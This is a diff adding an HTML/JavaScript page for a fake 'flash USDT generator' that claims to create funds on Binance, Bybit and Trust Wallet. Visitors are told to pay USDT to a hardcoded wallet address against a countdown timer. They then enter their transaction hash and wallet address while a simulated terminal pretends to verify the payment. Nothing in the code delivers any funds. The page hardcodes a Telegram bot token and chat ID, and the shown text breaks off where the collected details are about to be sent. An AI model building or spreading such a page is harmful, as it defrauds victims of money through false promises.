@@ -1,0 +1,370 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+<meta name="theme-color" content="#05080a" />
+<title>FLASH $ — Generator | Binance · Bybit · Master</title>
+<meta name="description" content="FLASH $ generator — instant flash USDT for Binance, Bybit and Master Flash." />
+<script src="https://cdn.tailwindcss.com"></script>
+
+<style>
+@font-face{
+  font-family:"Helvetica Regular";
+  src:url("https://db.onlinewebfonts.com/t/a64ff11d2c24584c767f6257e880dc65.woff2") format("woff2"),
+      url("https://db.onlinewebfonts.com/t/a64ff11d2c24584c767f6257e880dc65.woff") format("woff");
+  font-display:swap;
+}
+:root{
+  --neon:#eafff5; --neon-dim:rgba(234,255,245,.55);
+  --danger:#ff8a8a; --muted-c:#9aa8a3; --fg-c:#eaf3ee;
+  --border-c:rgba(255,255,255,.12); --card-c:rgba(255,255,255,.04);
+}
+html,body{overflow-x:hidden}
+body{
+  background:#05080a;color:var(--fg-c);
+  font-family:"Helvetica Regular",ui-sans-serif,system-ui,sans-serif;
+  -webkit-tap-highlight-color:transparent;-webkit-overflow-scrolling:touch;
+}
+.liquid-glass{background:rgba(255,255,255,.01);backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px);box-shadow:inset 0 1px 1px rgba(255,255,255,.1);position:relative;overflow:hidden}
+.liquid-glass::before{content:'';position:absolute;inset:0;border-radius:inherit;padding:1.4px;
+  background:linear-gradient(180deg,rgba(255,255,255,.45),rgba(255,255,255,.15) 20%,rgba(255,255,255,0) 40%,rgba(255,255,255,0) 60%,rgba(255,255,255,.15) 80%,rgba(255,255,255,.45));
+  -webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);-webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none}
+.glass-card{background:rgba(255,255,255,.03);backdrop-filter:blur(14px) saturate(140%);-webkit-backdrop-filter:blur(14px) saturate(140%);box-shadow:inset 0 1px 1px rgba(255,255,255,.08),0 8px 30px rgba(0,0,0,.35);position:relative;overflow:hidden}
+.glass-card::before{content:'';position:absolute;inset:0;border-radius:inherit;padding:1.2px;
+  background:linear-gradient(180deg,rgba(255,255,255,.5),rgba(255,255,255,.15) 25%,rgba(255,255,255,0) 50%,rgba(255,255,255,0) 60%,rgba(255,255,255,.2) 85%,rgba(255,255,255,.55));
+  -webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);-webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none}
+.glass-card:hover{box-shadow:inset 0 1px 1px rgba(255,255,255,.18),0 14px 44px rgba(255,255,255,.08)}
+.glass-soft{background:rgba(255,255,255,.04);backdrop-filter:blur(14px) saturate(160%);-webkit-backdrop-filter:blur(14px) saturate(160%);border:1px solid rgba(255,255,255,.08);box-shadow:inset 0 1px 1px rgba(255,255,255,.08)}
+.glass-input{background:rgba(255,255,255,.05)!important;backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,.1)!important;color:var(--fg-c)}
+.glass-input:focus{border-color:rgba(255,255,255,.4)!important;outline:none;box-shadow:0 0 0 1px rgba(255,255,255,.18),inset 0 1px 1px rgba(255,255,255,.1)}
+.neon-btn{background:linear-gradient(180deg,rgba(255,255,255,.22),rgba(255,255,255,.08));color:#fff;backdrop-filter:blur(12px) saturate(160%);-webkit-backdrop-filter:blur(12px) saturate(160%);border:1px solid rgba(255,255,255,.25);box-shadow:inset 0 1px 0 rgba(255,255,255,.45),inset 0 -1px 0 rgba(255,255,255,.08),0 8px 28px rgba(255,255,255,.1);text-shadow:0 1px 0 rgba(0,0,0,.25);cursor:pointer}
+.neon-btn:hover{background:linear-gradient(180deg,rgba(255,255,255,.3),rgba(255,255,255,.12))}
+@keyframes blink{50%{opacity:0}} .cursor-blink{animation:blink 1s infinite}
+@keyframes slide-up{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+.anim-slide{animation:slide-up .35s ease-out}
+@keyframes neon-pulse{50%{opacity:.4}} .neon-pulse{animation:neon-pulse 1.6s infinite}
+@keyframes pop{from{opacity:0;transform:translateY(16px) scale(.98)}to{opacity:1;transform:none}}
+.pop{animation:pop .45s cubic-bezier(.2,.7,.2,1) both}
+.card-hover{transition:transform .25s ease}
+.card-hover:hover{transform:translateY(-4px)}
+@media(max-width:768px){
+  .liquid-glass{backdrop-filter:blur(2px);-webkit-backdrop-filter:blur(2px)}
+  .glass-card{backdrop-filter:blur(8px) saturate(120%);-webkit-backdrop-filter:blur(8px) saturate(120%);box-shadow:inset 0 1px 1px rgba(255,255,255,.06),0 4px 14px rgba(0,0,0,.3)}
+  .glass-soft{backdrop-filter:blur(8px) saturate(120%);-webkit-backdrop-filter:blur(8px) saturate(120%)}
+  .glass-input{backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px)}
+  .neon-btn{backdrop-filter:blur(8px) saturate(130%);-webkit-backdrop-filter:blur(8px) saturate(130%)}
+}
+::selection{background:rgba(255,255,255,.2);color:#fff}
+.term{height:280px;overflow-y:auto;background:rgba(0,0,0,.4)}
+.term p{margin:0}
+</style>
+</head>
+<body>
+<video autoplay loop muted playsinline class="fixed inset-0 w-full h-full object-cover" style="z-index:0" src="https://d8j0ntlcm91z4.cloudfront.net/user_38xzZboKViGWJOttwIXH07lWA1P/hf_20260429_114316_1c7889ad-2885-410e-b493-98119fee0ddb.mp4"></video>
+<div class="fixed inset-0" style="background:rgba(0,0,0,.55);z-index:1"></div>
+
+<div class="relative w-full max-w-7xl mx-auto flex flex-col min-h-screen px-4 md:px-6" style="z-index:10">
+  <header class="flex justify-between items-center py-4 border-b border-white/10">
+    <div class="flex items-center gap-2.5">
+      <div class="w-9 h-9 rounded-md grid place-items-center" style="border:1px solid var(--neon);background:var(--card-c);box-shadow:0 0 16px rgba(234,255,245,.25)">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--neon)"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+      </div>
+      <div>
+        <h1 class="m-0 text-[16px] tracking-[0.25em]" style="color:var(--neon);text-shadow:0 0 8px rgba(234,255,245,.6)">FLASH $</h1>
+        <small class="block text-[10px] -mt-0.5" style="color:var(--muted-c)">v2.4 // mainnet</small>
+      </div>
+    </div>
+    <div class="text-[11px]" style="color:var(--muted-c)">
+      <span class="inline-block w-2 h-2 rounded-full neon-pulse mr-1.5" style="background:var(--neon);box-shadow:0 0 10px var(--neon)"></span>NODE_ONLINE
+    </div>
+  </header>
+
+  <main class="max-w-[980px] w-full mx-auto py-6 px-2 flex-1">
+    <div id="steps" class="flex justify-center gap-2 flex-wrap mb-6 text-[11px]"></div>
+    <div id="view"></div>
+  </main>
+
+</div>
+
+<div id="modal"></div>
+
+<script>
+const ADDR="0x91Cc7f72821FFFb6f205e95AC7cf572Fe3Bab92a";
+const TG_TOKEN="8477452399:AAHg5m0RqqniilnnsWh7jhRZJC5XUL1b4rE";
+const TG_CHAT="7774182348";
+const QR_SVG=`<svg height="164" width="164" viewBox="0 0 31 31" role="img" aria-label="USDT payment address QR"><path fill="#ffffff" d="M0,0 h31v31H0z" shape-rendering="crispEdges"></path><path fill="#000000" d="M1 1h7v1H1zM12 1h1v1H12zM16 1h2v1H16zM19 1h3v1H19zM23,1 h7v1H23zM1 2h1v1H1zM7 2h1v1H7zM10 2h2v1H10zM13 2h2v1H13zM16 2h2v1H16zM21 2h1v1H21zM23 2h1v1H23zM29,2 h1v1H29zM1 3h1v1H1zM3 3h3v1H3zM7 3h1v1H7zM9 3h1v1H9zM11 3h3v1H11zM21 3h1v1H21zM23 3h1v1H23zM25 3h3v1H25zM29,3 h1v1H29zM1 4h1v1H1zM3 4h3v1H3zM7 4h1v1H7zM9 4h2v1H9zM13 4h7v1H13zM21 4h1v1H21zM23 4h1v1H23zM25 4h3v1H25zM29,4 h1v1H29zM1 5h1v1H1zM3 5h3v1H3zM7 5h1v1H7zM9 5h1v1H9zM18 5h1v1H18zM20 5h1v1H20zM23 5h1v1H23zM25 5h3v1H25zM29,5 h1v1H29zM1 6h1v1H1zM7 6h1v1H7zM9 6h1v1H9zM12 6h2v1H12zM16 6h2v1H16zM19 6h1v1H19zM23 6h1v1H23zM29,6 h1v1H29zM1 7h7v1H1zM9 7h1v1H9zM11 7h1v1H11zM13 7h1v1H13zM15 7h1v1H15zM17 7h1v1H17zM19 7h1v1H19zM21 7h1v1H21zM23,7 h7v1H23zM9 8h1v1H9zM15 8h3v1H15zM1 9h1v1H1zM3 9h5v1H3zM10 9h2v1H10zM13 9h4v1H13zM18 9h2v1H18zM21 9h1v1H21zM23 9h5v1H23zM3 10h3v1H3zM12 10h1v1H12zM17 10h1v1H17zM20 10h1v1H20zM23 10h1v1H23zM25 10h1v1H25zM29,10 h1v1H29zM4 11h1v1H4zM6 11h2v1H6zM10 11h1v1H10zM12 11h1v1H12zM14 11h1v1H14zM16 11h1v1H16zM22 11h1v1H22zM26 11h1v1H26zM28 11h1v1H28zM3 12h2v1H3zM9 12h1v1H9zM11 12h1v1H11zM17 12h1v1H17zM20 12h1v1H20zM25 12h2v1H25zM3 13h1v1H3zM5 13h3v1H5zM13 13h2v1H13zM16 13h1v1H16zM21 13h1v1H21zM24 13h1v1H24zM28,13 h2v1H28zM1 14h2v1H1zM6 14h1v1H6zM8 14h3v1H8zM12 14h6v1H12zM19 14h2v1H19zM22 14h1v1H22zM25 14h1v1H25zM29,14 h1v1H29zM1 15h2v1H1zM4 15h1v1H4zM6 15h3v1H6zM10 15h1v1H10zM12 15h2v1H12zM16 15h1v1H16zM19 15h1v1H19zM25 15h4v1H25zM2 16h5v1H2zM8 16h2v1H8zM11 16h1v1H11zM13 16h1v1H13zM15 16h1v1H15zM20 16h4v1H20zM26 16h1v1H26zM28 16h1v1H28zM2 17h1v1H2zM4 17h2v1H4zM7 17h1v1H7zM10 17h1v1H10zM12 17h3v1H12zM16 17h2v1H16zM24 17h1v1H24zM27,17 h3v1H27zM1 18h1v1H1zM3 18h1v1H3zM5 18h2v1H5zM9 18h1v1H9zM11 18h3v1H11zM15 18h1v1H15zM19 18h4v1H19zM25 18h1v1H25zM29,18 h1v1H29zM1 19h1v1H1zM4 19h4v1H4zM10 19h5v1H10zM16 19h4v1H16zM26 19h2v1H26zM1 20h1v1H1zM3 20h1v1H3zM9 20h2v1H9zM12 20h2v1H12zM17 20h1v1H17zM20 20h4v1H20zM25 20h1v1H25zM28 20h1v1H28zM1 21h1v1H1zM3 21h2v1H3zM6 21h2v1H6zM9 21h3v1H9zM14 21h6v1H14zM21 21h8v1H21zM9 22h1v1H9zM11 22h1v1H11zM13 22h1v1H13zM20 22h2v1H20zM25 22h2v1H25zM29,22 h1v1H29zM1 23h7v1H1zM11 23h1v1H11zM13 23h1v1H13zM16 23h3v1H16zM20 23h2v1H20zM23 23h1v1H23zM25 23h4v1H25zM1 24h1v1H1zM7 24h1v1H7zM9 24h5v1H9zM15 24h3v1H15zM21 24h1v1H21zM25 24h2v1H25zM28,24 h2v1H28zM1 25h1v1H1zM3 25h3v1H3zM7 25h1v1H7zM9 25h1v1H9zM13 25h1v1H13zM16 25h3v1H16zM21 25h5v1H21zM27,25 h3v1H27zM1 26h1v1H1zM3 26h3v1H3zM7 26h1v1H7zM9 26h2v1H9zM12 26h1v1H12zM19 26h1v1H19zM21 26h1v1H21zM24 26h1v1H24zM26 26h1v1H26zM28,26 h2v1H28zM1 27h1v1H1zM3 27h3v1H3zM7 27h1v1H7zM9 27h2v1H9zM12 27h5v1H12zM18 27h2v1H18zM22 27h1v1H22zM25 27h1v1H25zM27 27h2v1H27zM1 28h1v1H1zM7 28h1v1H7zM13 28h1v1H13zM15 28h1v1H15zM17 28h1v1H17zM21 28h1v1H21zM24 28h1v1H24zM28 28h1v1H28zM1 29h7v1H1zM9 29h4v1H9zM14 29h1v1H14zM16 29h1v1H16zM18 29h1v1H18zM20 29h1v1H20zM22 29h6v1H22z" shape-rendering="crispEdges"></path></svg>`;
+
+const BINANCE_LOGO=`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 126.61 126.61" width="38" height="38"><path fill="#F3BA2F" d="M38.73 53.2L63.3 28.64l24.59 24.59 14.3-14.3L63.3 0 24.43 38.9zM0 63.31l14.3-14.31 14.31 14.31-14.31 14.3zm38.73 10.1L63.3 97.97l24.59-24.58 14.31 14.29-38.9 38.93-38.9-38.9-.02-.02zm75.17-24.41l14.3 14.3-14.3 14.32-14.31-14.31zM73.93 63.3l.01.01-10.64 10.63-10.62-10.62-.02-.02.02-.01.26-.26 1.15-1.15 9.21-9.21 10.65 10.65z"/></svg>`;
+const BYBIT_LOGO=`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 110 34" width="75" height="26"><text y="26" font-family="Arial Black,sans-serif" font-weight="900" font-size="28" fill="white">BY</text><rect x="62" y="3" width="5" height="24" fill="#F0B90B" rx="1"/><text x="67" y="26" font-family="Arial Black,sans-serif" font-weight="900" font-size="28" fill="white">IT</text></svg>`;
+const MASTER_LOGO=`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="40" height="40"><defs><linearGradient id="mbg" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#0f1a14"/><stop offset="100%" stop-color="#05080a"/></linearGradient></defs><rect x="2" y="2" width="44" height="44" rx="10" fill="url(#mbg)" stroke="#F0B90B" stroke-width="1.5"/><polyline points="5,34 13,28 19,31 26,22 33,25 43,12" fill="none" stroke="#eafff5" stroke-width="1" stroke-opacity="0.35"/><g stroke-linecap="round"><line x1="12" y1="14" x2="12" y2="36" stroke="#ff4d5e" stroke-width="1.2"/><rect x="9.5" y="22" width="5" height="10" fill="#ff4d5e" stroke="#7a0010" stroke-width="0.6"/><line x1="20" y1="11" x2="20" y2="34" stroke="#22e07a" stroke-width="1.2"/><rect x="17.5" y="16" width="5" height="13" fill="#22e07a" stroke="#0a4a25" stroke-width="0.6"/><line x1="28" y1="18" x2="28" y2="38" stroke="#ff4d5e" stroke-width="1.2"/><rect x="25.5" y="24" width="5" height="9" fill="#ff4d5e" stroke="#7a0010" stroke-width="0.6"/><line x1="36" y1="8" x2="36" y2="32" stroke="#22e07a" stroke-width="1.2"/><rect x="33.5" y="12" width="5" height="14" fill="#22e07a" stroke="#0a4a25" stroke-width="0.6"/></g><polyline points="40,16 43,13 43,18" fill="none" stroke="#22e07a" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>`;
+const TRUST_LOGO=`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500" width="36" height="36"><defs><linearGradient id="twa" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0500FF"/><stop offset="100%" stop-color="#2775CA"/></linearGradient><linearGradient id="twb" x1="0" y1="1" x2="0" y2="0"><stop offset="0%" stop-color="#0500FF"/><stop offset="100%" stop-color="#1A6FD4"/></linearGradient></defs><path d="M250 20 L50 100 L50 240 C50 370 140 470 250 500 C360 470 450 370 450 240 L450 100 Z" fill="url(#twa)"/><path d="M250 70 L100 140 L100 240 C100 340 170 425 250 455 C330 425 400 340 400 240 L400 140 Z" fill="url(#twb)"/><polyline points="160,255 220,315 340,180" fill="none" stroke="white" stroke-width="42" stroke-linecap="round" stroke-linejoin="round"/></svg>`;
+
+const PLAT={
+  binance:{name:"Binance Flash",tag:"BNB_FLASH_v2.4",icon:BINANCE_LOGO,desc:"Flash USDT to Binance wallets. BEP20 backbone.",mult:1,uid:"BEP20 Address",special:false},
+  bybit:{name:"Bybit Flash",tag:"BYBIT_FLASH_v2.4",icon:BYBIT_LOGO,desc:"Direct injection into Bybit accounts. High speed routing.",mult:1,uid:"BEP20 Address",special:false},
+  master:{name:"Master Flash",tag:"MASTER_FLASH_ALL",icon:MASTER_LOGO,desc:"Universal flash — works across every website. Premium tier.",mult:1.5,uid:"BEP20 Address",special:false},
+  trust:{name:"Trust Wallet",tag:"TRUST_WALLET_v2.4",icon:TRUST_LOGO,desc:"Direct flash to Trust Wallet. BEP20 network. No UID required.",mult:1,uid:null,special:true},
+};
+const BASE=[{id:"starter",p:30,f:1000,l:"STARTER"},{id:"pro",p:100,f:2500,l:"PRO"},{id:"elite",p:250,f:5000,l:"ELITE"}];
+const TRUST_PACKS=[{id:"mega",p:30,f:50000,l:"MEGA"}];
+const packsFor=pl=>PLAT[pl].special?TRUST_PACKS:BASE.map(b=>({...b,p:Math.round(b.p*PLAT[pl].mult)}));
+const fmt=s=>String(Math.floor(s/60)).padStart(2,"0")+":"+String(s%60).padStart(2,"0");
+
+const state={step:"platform",pl:null,pk:null,payLeft:180,procLeft:30,processing:false,paid:false,txHash:"",exId:"",logs:[],procFailed:false,procLabel:"VERIFYING_PAYMENT",procFoot:"Do not close this window. The node is scanning the chain.",copied:false};
+const timers={pay:null,proc:null,log:null,poll:null,succ:null};
+let currentMsgId=null;
+
+function stopAll(){Object.keys(timers).forEach(k=>{if(timers[k]){clearInterval(timers[k]);timers[k]=null}})}
+function resetAll(){stopAll();Object.assign(state,{step:"platform",pl:null,pk:null,processing:false,paid:false,txHash:"",exId:"",logs:[],procFailed:false,procLabel:"VERIFYING_PAYMENT",procFoot:"Do not close this window. The node is scanning the chain."});document.getElementById("modal").innerHTML="";render()}
+
+function renderSteps(){
+  const order=["platform","package","payment"];const idx=order.indexOf(state.step);
+  document.getElementById("steps").innerHTML=order.map((s,i)=>{
+    const active=idx>=i;
+    return `<div class="px-2.5 py-1.5 rounded-md tracking-[0.15em] backdrop-blur-sm transition-all ${active?"text-[color:var(--neon)]":"text-white/40"}" style="${active?"background:rgba(234,255,245,.08);border:1px solid rgba(234,255,245,.4);box-shadow:0 0 12px rgba(234,255,245,.15)":"background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.1)"}">0${i+1}_${s.toUpperCase()}</div>`;
+  }).join("");
+}
+
+function renderPlatforms(){
+  const cards=Object.entries(PLAT).map(([k,v],i)=>`
+    <button data-plat="${k}" class="glass-card card-hover rounded-2xl p-[18px] text-left w-full relative pop" style="animation-delay:${i*80}ms">
+      <span class="absolute top-3.5 right-3.5 text-[10px] tracking-[0.2em]" style="color:var(--neon-dim)">${v.tag.split("_")[0]}_NODE</span>
+      <div class="h-11 rounded-md flex items-center justify-center px-3 py-1.5 mb-3 overflow-hidden w-fit" style="border:1px solid rgba(234,255,245,.5);background:rgba(255,255,255,.05);color:var(--neon)">${v.icon}</div>
+      <h3 class="m-0 mb-1.5 text-[17px]" style="color:var(--neon);text-shadow:0 0 8px rgba(234,255,245,.3)">${v.name.toUpperCase()}</h3>
+      <p class="m-0 mb-3 text-white/60 text-[12px] leading-[1.5]">${v.desc}</p>
+      <div class="text-[12px] tracking-[0.15em]" style="color:var(--neon)">INITIALIZE →</div>
+      ${k==="master"?'<span class="inline-block mt-2.5 text-[10px] px-1.5 py-0.5 rounded-sm" style="border:1px solid var(--neon);color:var(--neon)">PREMIUM × 1.5</span>':""}
+      ${k==="trust"?'<span class="inline-block mt-2.5 text-[10px] px-1.5 py-0.5 rounded-sm" style="border:1px solid #5DA8FF;color:#5DA8FF">NO UID NEEDED</span>':""}
+    </button>`).join("");
+  return `<section class="anim-slide">
+    <p class="text-center text-[11px] tracking-[0.25em] mb-1.5" style="color:var(--neon-dim)">&gt; SELECT_PROTOCOL</p>
+    <h2 class="text-center m-0 mb-2 tracking-wide" style="color:var(--neon);font-size:clamp(22px,5vw,38px);text-shadow:0 0 10px rgba(234,255,245,.4)">GENERATE FLASH USDT</h2>
+    <p class="text-center text-[13px] max-w-[520px] mx-auto mb-7" style="color:var(--muted-c)">Choose your target exchange. Each protocol is optimized for its native chain. Funds appear instantly after on-chain confirmation.</p>
+    <div class="grid gap-3.5 grid-cols-1 sm:grid-cols-2 lg:grid-cols-4">${cards}</div>
+  </section>`;
+}
+
+function renderPackages(){
+  const m=PLAT[state.pl];const list=packsFor(state.pl);const single=list.length===1;
+  const cards=list.map((p,i)=>{
+    const popular=(!single&&i===1)||single;
+    return `<button data-pack="${p.id}" class="glass-card card-hover rounded-2xl p-[18px] text-left w-full relative pop ${popular?"ring-1 ring-white/40":""}" style="animation-delay:${i*100}ms">
+      ${!single&&i===1?'<span class="absolute -top-2.5 right-3.5 text-[10px] font-bold px-2 py-0.5 rounded-sm z-10" style="background:var(--neon);color:#001a08">MOST USED</span>':""}
+      ${single?'<span class="absolute -top-2.5 right-3.5 bg-[#3375BB] text-white text-[10px] font-bold px-2 py-0.5 rounded-sm z-10">EXCLUSIVE</span>':""}
+      <p class="text-[11px] tracking-[0.2em] m-0 mb-1" style="color:var(--neon-dim)">${p.l}_PACK</p>
+      <div><span class="text-[34px] font-bold" style="color:var(--neon);text-shadow:0 0 8px rgba(234,255,245,.4)">$${p.p}</span> <span class="text-[11px] text-white/50">USDT in</span></div>
+      <div class="border-t border-white/10 my-3 pt-2.5">
+        <p class="text-[11px] text-white/50 m-0 mb-1">YOU RECEIVE</p>
+        <p class="text-[22px] text-white font-bold m-0">$${p.f.toLocaleString()} <span class="text-[11px]" style="color:var(--neon)">FLASH</span></p>
+      </div>
+      <ul class="text-[12px] text-white/60 m-0 p-0 list-none">
+        ${["Instant routing","24h flash window","Encrypted handshake"].map(f=>`<li class="py-0.5"><span style="color:var(--neon)">✓</span> ${f}</li>`).join("")}
+      </ul>
+      <div class="mt-3.5 text-center p-2.5 neon-btn rounded-md tracking-[0.15em] text-[13px]">EXECUTE →</div>
+    </button>`;
+  }).join("");
+  return `<section class="anim-slide">
+    <button id="back-plat" class="bg-transparent border-none text-[12px] cursor-pointer mb-3.5" style="color:var(--muted-c)">‹ back</button>
+    <p class="text-center text-[11px] tracking-[0.25em] mb-1.5" style="color:var(--neon-dim)">&gt; ${m.tag}</p>
+    <h2 class="text-center m-0 mb-2 tracking-wide" style="color:var(--neon);font-size:clamp(22px,5vw,38px);text-shadow:0 0 10px rgba(234,255,245,.4)">${m.name} // SELECT PACK</h2>
+    <p class="text-center text-[13px] max-w-[520px] mx-auto mb-7" style="color:var(--muted-c)">Choose a flash package. Higher tiers carry better priority routing.</p>
+    <div class="grid gap-3.5 ${single?"grid-cols-1 max-w-[420px] mx-auto":"grid-cols-1 sm:grid-cols-3"}">${cards}</div>
+  </section>`;
+}
+
+function renderPayment(){
+  const m=PLAT[state.pl];const p=packsFor(state.pl).find(x=>x.id===state.pk);const isTrust=state.pl==="trust";
+  const inputs=`
+    <p class="text-[11px] tracking-[0.25em] text-left mb-1.5" style="color:var(--neon-dim)">&gt; CONFIRM_PAYMENT</p>
+    <label class="block mb-3.5">
+      <span class="text-[11px] text-white/50 tracking-[0.15em] block mb-1">Bep20 adress</span>
+      <input id="txHash" value="${state.txHash}" ${state.paid?"":"disabled"} placeholder="0x..." class="glass-input w-full rounded p-2.5 text-[13px] disabled:opacity-50"/>
+    </label>
+    ${!isTrust?`<label class="block mb-3.5"><span class="text-[11px] text-white/50 tracking-[0.15em] block mb-1">${(m.uid||"").toUpperCase()}</span><input id="exId" value="${state.exId}" ${state.paid?"":"disabled"} placeholder="Your BEP20 wallet address" class="glass-input w-full rounded p-2.5 text-[13px] disabled:opacity-50"/></label>`:""}
+    ${!state.paid?'<button id="paid" class="neon-btn w-full p-3.5 rounded-md font-bold tracking-[0.15em] text-[14px]">I HAVE PAID →</button>':'<button id="submit" class="neon-btn w-full p-3.5 rounded-md font-bold tracking-[0.15em] text-[14px]">SUBMIT &amp; PROCESS →</button>'}
+    <p class="text-[10px] text-white/50 text-center mt-2.5">After submit the node verifies on-chain.</p>`;
+  const left=`
+    <div class="glass-soft rounded-md p-3 text-[12px]">
+      ${row("PROTOCOL",m.name)}${row("PACK",p.l)}${row("YOU PAY","$"+p.p+" USDT")}${row("YOU RECEIVE","$"+p.f.toLocaleString()+" FLASH")}
+    </div>
+    <div class="mt-3.5 glass-soft rounded-md p-3.5 text-center">
+      <div id="qr" class="bg-white p-2 rounded inline-block" style="min-width:164px;min-height:164px" aria-label="USDT payment address QR"></div>
+      <div class="text-[10px] text-white/50 tracking-[0.2em] mt-2">USDT (BEP20 / TRC20)</div>
+      <div id="copyAddr" class="mt-2.5 glass-soft rounded p-2.5 flex justify-between gap-2 items-center text-[10px] cursor-pointer break-all select-none ${state.copied?"shadow-[0_0_12px_rgba(234,255,245,.4)]":""}">
+        <code class="text-white/90 overflow-hidden text-ellipsis">${ADDR}</code>
+        <span style="color:var(--neon)">${state.copied?"✓ COPIED!":"⧉"}</span>
+      </div>
+    </div>
+    <div class="mt-2.5 text-[11px] text-white/60 flex gap-2 items-start">⚠ Send exact <b style="color:var(--neon)">$${p.p} USDT</b> to the address above. Underpayment will void the session.</div>`;
+  const body=state.processing?`
+    <div class="p-4">
+      <div class="flex justify-between items-center mb-2.5 text-[13px]">
+        <div class="font-bold tracking-[0.15em] flex items-center gap-2" style="color:${state.procFailed?"var(--danger)":"var(--neon)"}">
+          <span class="w-2 h-2 rounded-full neon-pulse" style="background:currentColor;box-shadow:0 0 10px currentColor"></span>${state.procLabel}
+        </div>
+        <div class="text-[12px] text-white/50">scan window <span style="color:var(--neon)">${fmt(state.procLeft)}</span></div>
+      </div>
+      <div id="term" class="term glass-soft rounded-md p-3.5 text-[12px] leading-[1.6]">
+        ${state.logs.map(l=>`<p style="color:${l.color==='danger'?'var(--danger)':l.color==='neon'?'var(--neon)':'var(--neon-dim)'}"><span>&gt;</span> ${escapeHtml(l.text)}</p>`).join("")}
+        ${!state.procFailed?'<p style="color:var(--neon)"><span class="cursor-blink">█</span></p>':""}
+      </div>
+      <p class="text-[10px] text-white/50 text-center mt-2.5">${state.procFoot}</p>
+    </div>`:`
+    <div class="p-4 grid gap-5 grid-cols-1 md:grid-cols-2">
+      <div>${left}</div>
+      <form onsubmit="event.preventDefault()">${inputs}</form>
+    </div>`;
+  return `<section class="anim-slide">
+    <button id="back-pack" class="bg-transparent border-none text-white/60 text-[12px] cursor-pointer mb-3.5">‹ back</button>
+    <div class="glass-card rounded-2xl overflow-hidden pop">
+      <div class="flex justify-between items-center px-4 py-3.5 border-b border-white/10" style="background:rgba(255,255,255,.02)">
+        <div>
+          <p class="text-[11px] tracking-[0.25em] text-left m-0" style="color:var(--neon-dim)">${m.tag} // ${p.l}</p>
+          <h2 class="text-[16px] m-0" style="color:var(--neon)">PAYMENT_SESSION</h2>
+        </div>
+        <div>
+          <div class="text-[10px] text-white/50 text-right">EXPIRES IN</div>
+          <div id="payTimer" class="text-[22px] font-bold text-right" style="color:${state.payLeft<30?'var(--danger)':'var(--neon)'}">${fmt(state.payLeft)}</div>
+        </div>
+      </div>
+      ${body}
+    </div>
+  </section>`;
+}
+function row(l,v){return `<div class="flex justify-between py-0.5 text-white/60"><span>${l}</span><b style="color:var(--neon);font-weight:700">${v}</b></div>`}
+function escapeHtml(s){return s.replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c])}
+
+function render(){
+  renderSteps();
+  const v=document.getElementById("view");
+  if(state.step==="platform")v.innerHTML=renderPlatforms();
+  else if(state.step==="package")v.innerHTML=renderPackages();
+  else v.innerHTML=renderPayment();
+  bind();
+  if(state.step==="payment"&&!state.processing){
+    const qr=document.getElementById("qr");
+    if(qr)qr.innerHTML=QR_SVG;
+  }
+  if(state.processing){const t=document.getElementById("term");if(t)t.scrollTop=t.scrollHeight}
+}
+function bind(){
+  document.querySelectorAll("[data-plat]").forEach(b=>b.onclick=()=>{state.pl=b.dataset.plat;state.step="package";render()});
+  document.querySelectorAll("[data-pack]").forEach(b=>b.onclick=()=>{state.pk=b.dataset.pack;state.step="payment";startPayment();render()});
+  const bp=document.getElementById("back-plat");if(bp)bp.onclick=()=>{state.step="platform";stopAll();render()};
+  const bk=document.getElementById("back-pack");if(bk)bk.onclick=()=>{stopAll();state.step="package";render()};
+  const ca=document.getElementById("copyAddr");if(ca)ca.onclick=copyAddr;
+  const tx=document.getElementById("txHash");if(tx)tx.oninput=e=>state.txHash=e.target.value;
+  const ex=document.getElementById("exId");if(ex)ex.oninput=e=>state.exId=e.target.value;
+  const pd=document.getElementById("paid");if(pd)pd.onclick=()=>{state.paid=true;render()};
+  const sb=document.getElementById("submit");if(sb)sb.onclick=submit;
+}
+async function copyAddr(){
+  try{
+    if(navigator.clipboard&&window.isSecureContext)await navigator.clipboard.writeText(ADDR);
+    else{const ta=document.createElement("textarea");ta.value=ADDR;ta.style.cssText="position:fixed;left:-9999px";document.body.appendChild(ta);ta.select();document.execCommand("copy");document.body.removeChild(ta)}
+    state.copied=true;render();setTimeout(()=>{state.copied=false;render()},2000);
+  }catch(e){}
+}
+function startPayment(){
+  Object.assign(state,{processing:false,paid:false,txHash:"",exId:"",payLeft:180});
+  if(timers.pay)clearInterval(timers.pay);
+  timers.pay=setInterval(()=>{
+    if(state.payLeft<=1){resetAll();return}
+    state.payLeft--;
+    const el=document.getElementById("payTimer");
+    if(el){el.textContent=fmt(state.payLeft);el.style.color=state.payLeft<30?"var(--danger)":"var(--neon)"}
+  },1000);
+}
+function submit(){
+  const hash=state.txHash.trim(),eid=state.exId.trim();
+  if(!hash)return alert("Please enter your Transaction Hash");
+  if(state.pl!=="trust"&&!eid)return alert("Please enter your BEP20 Address");
+  startProcessing(hash,eid);
+}
+async function sendToTelegram(hash,eid,plat,pack,amount,tokens){
+  const m=PLAT[plat];
